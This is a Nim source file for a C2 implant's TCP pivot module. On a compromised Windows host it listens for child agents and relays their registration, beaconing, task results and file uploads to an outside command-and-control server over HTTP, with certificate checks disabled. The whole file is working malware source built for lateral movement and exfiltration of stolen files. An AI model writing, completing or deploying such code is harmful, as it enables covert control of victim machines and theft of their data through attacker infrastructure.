## tcp_pivot.nim — TCP pivot relay server.
## Child agents connect via TCP and send length-prefixed JSON frames.
## The pivot relays register/beacon/result/upload messages to the real C2.
## Frame: [payloadLen: uint32 LE][JSON bytes]

import winim/lean, winim/inc/winhttp
import std/[strutils, json, base64]
import config, crypto

const
  TCP_PIVOT_MAX = 8

var gTcpPivotSocks:   array[TCP_PIVOT_MAX, SOCKET]
var gTcpPivotThreads: array[TCP_PIVOT_MAX, HANDLE]
var gTcpPivotPorts:   array[TCP_PIVOT_MAX, int]
var gTcpPivotStop:    array[TCP_PIVOT_MAX, bool]
var gTcpPivotCount    = 0
var gTcpPivotAgentID*: string = ""

proc tcpDoRequest(meth, path: string; body: openArray[byte]): (int, seq[byte]) =
  var url = ServerUrl
  var isHttps = false
  var host = ""
  var port2 = 80
  if url.startsWith("https://"): url = url[8..^1]; isHttps = true; port2 = 443
  elif url.startsWith("http://"): url = url[7..^1]
  let sIdx = url.find('/')
  if sIdx >= 0: url = url[0..<sIdx]
  let cIdx = url.rfind(':')
  if cIdx >= 0:
    try: port2 = parseInt(url[cIdx+1..^1]) except: discard
    host = url[0..<cIdx]
  else: host = url
  let hSess = WinHttpOpen(newWideCString("endgame-tcp-pivot/1.0"),
    WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)
  if hSess == nil: return (-1, @[])
  defer: discard WinHttpCloseHandle(hSess)
  let hConn = WinHttpConnect(hSess, newWideCString(host), INTERNET_PORT(port2), 0)
  if hConn == nil: return (-1, @[])
  defer: discard WinHttpCloseHandle(hConn)
  let flags: DWORD = if isHttps: WINHTTP_FLAG_SECURE else: DWORD(0)
  let hReq = WinHttpOpenRequest(hConn, newWideCString(meth),
    newWideCString(path), nil, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags)
  if hReq == nil: return (-1, @[])
  defer: discard WinHttpCloseHandle(hReq)
  var secFlags = DWORD(SECURITY_FLAG_IGNORE_UNKNOWN_CA or SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE or
    SECURITY_FLAG_IGNORE_CERT_CN_INVALID or SECURITY_FLAG_IGNORE_CERT_DATE_INVALID)
  discard WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, addr secFlags, DWORD(sizeof(secFlags)))
  if gTcpPivotAgentID != "":
    let parentHdr = "X-C2-Parent: " & gTcpPivotAgentID & "\r\n"
    discard WinHttpAddRequestHeaders(hReq, newWideCString(parentHdr),
      DWORD(parentHdr.len), WINHTTP_ADDREQ_FLAG_ADD)
  let ct = "Content-Type: application/octet-stream\r\n"
  discard WinHttpAddRequestHeaders(hReq, newWideCString(ct), DWORD(ct.len), WINHTTP_ADDREQ_FLAG_ADD)
  let bodyPtr: LPVOID = if body.len > 0: cast[LPVOID](unsafeAddr body[0]) else: WINHTTP_NO_REQUEST_DATA
  if WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
      bodyPtr, DWORD(body.len), DWORD(body.len), 0) == 0:
    return (-1, @[])
  if WinHttpReceiveResponse(hReq, nil) == 0: return (-1, @[])
  var sc: DWORD = 0; var scLen = DWORD(sizeof(sc))
  discard WinHttpQueryHeaders(hReq,
    WINHTTP_QUERY_STATUS_CODE or WINHTTP_QUERY_FLAG_NUMBER,
    WINHTTP_HEADER_NAME_BY_INDEX, addr sc, addr scLen, WINHTTP_NO_HEADER_INDEX)
  var respData: seq[byte] = @[]
  var dwSize: DWORD = 0
  while WinHttpQueryDataAvailable(hReq, addr dwSize) != 0 and dwSize > 0:
    var chunk = newSeq[byte](int(dwSize))
    var dwDL: DWORD = 0
    if WinHttpReadData(hReq, cast[LPVOID](addr chunk[0]), dwSize, addr dwDL) != 0:
      respData.add(chunk[0..<int(dwDL)])
    else: break
  return (int(sc), respData)

proc tcpReadFrame(sock: SOCKET): seq[byte] =
  var lenBuf: array[4, byte]
  var got = 0
  while got < 4:
    let r = recv(sock, cast[ptr char](addr lenBuf[got]), int32(4 - got), 0)
    if r <= 0: return @[]
    got += r
  let frameLen = int(uint32(lenBuf[0]) or (uint32(lenBuf[1]) shl 8) or
                     (uint32(lenBuf[2]) shl 16) or (uint32(lenBuf[3]) shl 24))
  if frameLen > 4*1024*1024: return @[]
  var frame = newSeq[byte](frameLen)
  got = 0
  while got < frameLen:
    let r = recv(sock, cast[ptr char](addr frame[got]), int32(frameLen - got), 0)
    if r <= 0: return @[]
    got += r
  return frame

proc tcpWriteFrame(sock: SOCKET; data: openArray[byte]) =
  let dlen = uint32(data.len)
  var hdr: array[4, byte]
  hdr[0] = byte(dlen); hdr[1] = byte(dlen shr 8)
  hdr[2] = byte(dlen shr 16); hdr[3] = byte(dlen shr 24)
  discard send(sock, cast[ptr char](addr hdr[0]), 4, 0)
  if data.len > 0:
    discard send(sock, cast[ptr char](unsafeAddr data[0]), int32(data.len), 0)

type TcpClientParam = object
  clientSock: SOCKET
  pivotIdx:   int

proc tcpClientProc(p: LPVOID): DWORD {.stdcall.} =
  if p == nil: return 1
  let pp = cast[ptr TcpClientParam](p)
  let clientSock = pp.clientSock
  let pivotIdx   = pp.pivotIdx
  dealloc(p)
  defer: discard closesocket(clientSock)
  let regFrame = tcpReadFrame(clientSock)
  if regFrame.len == 0: return 1
  var msg: JsonNode
  try: msg = parseJson(cast[string](regFrame))
  except: return 1
  if msg{"t"}.getStr("") != "register": return 1
  let payload = msg{"p"}
  if payload.isNil: return 1
  var regMap = %*{
    "hostname":     payload{"hostname"}.getStr(""),
    "username":     payload{"username"}.getStr(""),
    "os":           payload{"os"}.getStr("windows"),
    "pid":          payload{"pid"}.getInt(0),
    "transport":    "tcp",
    "sleep_sec":    payload{"sleep_sec"}.getInt(60),
    "jitter_pct":   payload{"jitter_pct"}.getInt(20),
    "process_name": payload{"process_name"}.getStr(""),
    "is_admin":     payload{"is_admin"}.getBool(false),
    "language":     payload{"language"}.getStr("nim")
  }
  if gTcpPivotAgentID != "":
    regMap["parent_id"] = %gTcpPivotAgentID
  let regBodyStr = $regMap
  let regBody = cast[seq[byte]](regBodyStr)
  let (regStatus, regRespRaw) = tcpDoRequest("POST", "/register", regBody)
  if regStatus != 200 or regRespRaw.len == 0: return 1
  var regResp: JsonNode
  try: regResp = parseJson(cast[string](regRespRaw))
  except: return 1
  let agentID   = regResp{"agent_id"}.getStr("")
  let aesKeyB64 = regResp{"aes_key"}.getStr("")
  if agentID == "" or aesKeyB64 == "": return 1
  let aesKeyStr = try: base64.decode(aesKeyB64) except: return 1
  let aesKey    = cast[seq[byte]](aesKeyStr)
  let regRespMsg   = %*{"t": "register_resp", "p": regResp}
  let regRespBytes = cast[seq[byte]]($regRespMsg)
  tcpWriteFrame(clientSock, regRespBytes)
  while not gTcpPivotStop[pivotIdx]:
    let frame = tcpReadFrame(clientSock)
    if frame.len == 0: break
    var fMsg: JsonNode
    try: fMsg = parseJson(cast[string](frame))
    except: break
    case fMsg{"t"}.getStr("")
    of "beacon":
      let (bStatus, bData) = tcpDoRequest("GET", "/beacon/" & agentID, @[])
      if bStatus == 204 or bData.len == 0:
        let emptyPlain = cast[seq[byte]]("{\"tasks\":[]}")
        let encEmpty   = sealGCM(aesKey, emptyPlain)
        let encB64     = base64.encode(encEmpty)
        let resp = %*{"t": "tasks", "p": encB64}
        tcpWriteFrame(clientSock, cast[seq[byte]]($resp))
      else:
        let encB64 = base64.encode(bData)
        let resp   = %*{"t": "tasks", "p": encB64}
        tcpWriteFrame(clientSock, cast[seq[byte]]($resp))
    of "result":
      let encB64  = fMsg{"p"}.getStr("")
      let encData = try: cast[seq[byte]](base64.decode(encB64)) except: @[]
      if encData.len > 0:
        discard tcpDoRequest("POST", "/result/" & agentID, encData)
      let ack = %*{"t": "ack"}
      tcpWriteFrame(clientSock, cast[seq[byte]]($ack))
    of "upload":
      let encB64  = fMsg{"p"}.getStr("")
      let encData = try: cast[seq[byte]](base64.decode(encB64)) except: @[]
      if encData.len > 0:
        let plainBytes = try: openGCM(aesKey, encData) except: @[]
        if plainBytes.len > 0:
          let uj = try: parseJson(cast[string](plainBytes)) except: nil
          if not uj.isNil:
            let taskID = uj{"task_id"}.getInt(0)
            let fname  = uj{"filename"}.getStr("file")
            let fdata  = try: cast[seq[byte]](base64.decode(uj{"data"}.getStr(""))) except: @[]
            let uploadPath = "/upload/" & agentID & "?task_id=" & $taskID & "&filename=" & fname
            discard tcpDoRequest("POST", uploadPath, fdata)
      let ack = %*{"t": "ack"}
      tcpWriteFrame(clientSock, cast[seq[byte]]($ack))
    else: discard
  return 0

type TcpPivotServerParam = object
  port:     int
  pivotIdx: int

proc tcpPivotServerProc(p: LPVOID): DWORD {.stdcall.} =
  if p == nil: return 1
  let pp   = cast[ptr TcpPivotServerParam](p)
  let port = pp.port
  let idx  = pp.pivotIdx
  dealloc(p)
  var wsaData: WSADATA
  discard WSAStartup(WORD(0x0202), addr wsaData)
  let listenSock = socket(int32(AF_INET), int32(SOCK_STREAM), int32(IPPROTO_TCP))
  if listenSock == INVALID_SOCKET: return 1
  gTcpPivotSocks[idx] = listenSock
  var lsa: sockaddr_in
  lsa.sin_family      = int16(AF_INET)
  lsa.sin_port        = htons(uint16(port))
  lsa.sin_addr.S_addr = int32(0)
  var reuseOpt: int32 = 1
  discard setsockopt(listenSock, int32(SOL_SOCKET), int32(SO_REUSEADDR),
    cast[ptr char](addr reuseOpt), int32(sizeof(reuseOpt)))
  if `bind`(listenSock, cast[ptr sockaddr](addr lsa), int32(sizeof(lsa))) != 0:
    discard closesocket(listenSock); gTcpPivotSocks[idx] = INVALID_SOCKET; return 1
  if listen(listenSock, 16) != 0:
    discard closesocket(listenSock); gTcpPivotSocks[idx] = INVALID_SOCKET; return 1
  while not gTcpPivotStop[idx]:
    var cAddr: sockaddr_in; var cLen: int32 = int32(sizeof(cAddr))
    let cSock = accept(listenSock, cast[ptr sockaddr](addr cAddr), addr cLen)
    if cSock == INVALID_SOCKET: break
    let cp = cast[ptr TcpClientParam](alloc0(sizeof(TcpClientParam)))
    cp.clientSock = cSock; cp.pivotIdx = idx
    var tid: DWORD = 0
    discard CloseHandle(CreateThread(nil, 0, tcpClientProc, cast[LPVOID](cp), 0, addr tid))
  discard closesocket(listenSock)
  gTcpPivotSocks[idx] = INVALID_SOCKET
  return 0

proc startTcpPivot*(port: int): string =
  if gTcpPivotCount >= TCP_PIVOT_MAX:
    return "[-] TCP pivot: too many pivot servers running"
  let idx = gTcpPivotCount
  gTcpPivotStop[idx]  = false
  gTcpPivotPorts[idx] = port
  gTcpPivotSocks[idx] = INVALID_SOCKET
  let pp = cast[ptr TcpPivotServerParam](alloc0(sizeof(TcpPivotServerParam)))
  pp.port = port; pp.pivotIdx = idx
  var tid: DWORD = 0
  gTcpPivotThreads[idx] = CreateThread(nil, 0, tcpPivotServerProc,
    cast[LPVOID](pp), 0, addr tid)
  if gTcpPivotThreads[idx] == 0:
    gTcpPivotStop[idx] = true
    return "[-] TCP pivot: CreateThread failed"
  inc gTcpPivotCount
  return "[+] TCP pivot started on port " & $port

proc stopTcpPivot*(port: int): string =
  for i in 0..<gTcpPivotCount:
    if gTcpPivotPorts[i] == port or port == 0:
      gTcpPivotStop[i] = true
      if gTcpPivotSocks[i] != INVALID_SOCKET:
        discard closesocket(gTcpPivotSocks[i])
      if gTcpPivotThreads[i] != 0:
        discard WaitForSingleObject(gTcpPivotThreads[i], DWORD(3000))
        discard CloseHandle(gTcpPivotThreads[i])
        gTcpPivotThreads[i] = 0
      if port != 0:
        return "[+] TCP pivot on port " & $port & " stopped"
  if port == 0: return "[+] all TCP pivots stopped"
  return "[-] TCP pivot on port " & $port & " not found"
